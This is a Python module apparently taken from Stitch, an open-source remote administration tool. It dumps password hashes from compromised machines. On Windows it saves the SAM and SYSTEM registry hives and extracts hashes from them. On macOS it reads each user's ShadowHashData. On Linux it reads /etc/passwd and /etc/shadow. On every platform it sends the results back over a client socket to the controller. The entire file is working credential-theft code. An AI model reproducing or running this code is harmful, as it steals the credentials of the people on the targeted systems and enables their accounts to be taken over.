# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

def win_cleanup(h_temp):
    if os.path.exists(h_temp):
        shutil.rmtree(h_temp)

def windows_hashdump(sam_h,sys_h,hashtmp):
    if not os.path.exists(hashtmp):
        os.mkdir(hashtmp)

    sam = run_command('REG SAVE HKLM\\SAM {}'.format(sam_h))
    sys = run_command('REG SAVE HKLM\\SYSTEM {}'.format(sys_h))

    s = 'The operation completed successfully'
    if s in sam and s in sys:
        return "[+] Successfully saved SAM and SYSTEM registry hives.", True
    else:
        if s not in sam:
            return "[!] {}".format(sam), False
        if s not in sys:
            return "[!] {}".format(sys), False

if win_client():
    hashtmp = 'C:\\Windows\\Temp\\ST_9626N.tmp'
    sam_hive = 'C:\\Windows\\Temp\\ST_9626N.tmp\\cab_626_2'
    system_hive = 'C:\\Windows\\Temp\\ST_9626N.tmp\\cab_626_3'
    win_cleanup(hashtmp)
    resp, dump = windows_hashdump(sam_hive,system_hive,hashtmp)
    send(client_socket,resp)
    if dump:
        dump_notice ='[*] Attempting to dump hashes...'
        send(client_socket,dump_notice)
        pw_hashes = dump_file_hashes(system_hive,sam_hive)
        send(client_socket,pw_hashes)
        win_cleanup(hashtmp)
if osx_client():
    pw_hashes = ''
    success = False
    osx_ignore = ['daemon','root','nobody']
    users = run_command("dscl . list /Users | grep -v '^_'")
    users = users.split()
    for u in users:
        if u not in osx_ignore:
            cmd = 'defaults read "/var/db/dslocal/nodes/Default/users/{}.plist" ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - '.format(u)
            resp = run_command(cmd)
            if no_error(resp):
                pw_hashes += 'User: {}\n{}\n\n'.format(u,resp)
                success = True
    if success:
        send(client_socket,pw_hashes)
    else:
        err = '[!] Unable to dump password hashes.\n'
        send(client_socket, err)
if lnx_client():
    err = '[!] Unable to dump password hashes.\n'
    resp = run_command('cat /etc/passwd')
    if no_error(resp):
        send(client_socket, resp)
        resp2 = run_command('cat /etc/shadow')
        if no_error(resp2):
            send(client_socket, resp2)
        else:
            send(client_socket, err)
    else:
        send(client_socket, err)
